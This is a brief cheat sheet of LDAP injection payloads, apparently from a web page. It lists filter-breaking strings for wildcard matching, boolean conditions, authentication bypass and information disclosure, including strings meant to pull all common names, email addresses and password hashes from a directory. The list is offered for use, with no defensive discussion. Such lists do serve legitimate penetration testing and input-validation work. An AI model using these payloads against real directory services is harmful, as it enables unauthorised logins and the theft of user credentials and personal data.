LDAP Injection Payloads

      
1. Wildcard Injection:

      
    
        
  • * - Returns all users
    • 
        
  • admin* - Returns users starting with "admin"
    • 
        
  • *)(uid=* - Bypass filter
    • 
      


      
2. Boolean-based Injection:

      
    
        
  • admin)(|(uid=* - OR condition
    • 
        
  • admin)(&(uid=* - AND condition
    • 
        
  • admin)(!(uid=test - NOT condition
    • 
      


      
3. Authentication Bypass:

      
    
        
  • admin)(& - Always true
    • 
        
  • *)(|(password=* - Bypass password check
    • 
        
  • admin)(|(1=1 - Always true condition
    • 
      


      
4. Information Disclosure:

      
    
        
  • *)(cn=* - Extract all common names
    • 
        
  • *)(mail=* - Extract all email addresses
    • 
        
  • *)(userPassword=* - Extract password hashes
